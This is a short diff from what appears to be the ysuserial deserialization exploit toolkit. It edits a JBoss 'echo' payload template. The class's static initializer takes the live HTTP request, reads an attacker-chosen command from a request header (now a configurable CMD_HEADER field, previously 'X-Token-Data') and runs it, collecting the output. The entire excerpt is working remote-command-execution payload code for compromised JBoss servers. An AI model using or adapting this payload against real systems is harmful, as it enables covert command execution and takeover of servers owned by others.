@@ -6,10 +6,12 @@ package org.su18.ysuserial.payloads.templates.echo;
  */
 public class JbossEcho {
 
+	public static String CMD_HEADER;
+
 	static {
 		try {
 			Object req = javax.security.jacc.PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
-			String cmd = getMethodAndInvoke(req, "getHeader", new Class[]{String.class}, new Object[]{"X-Token-Data"}).toString();
+			String cmd = getMethodAndInvoke(req, "getHeader", new Class[]{String.class}, new Object[]{CMD_HEADER}).toString();
 
 			if (cmd != null && !cmd.isEmpty()) {
 				java.io.ByteArrayOutputStream baos = q(cmd);
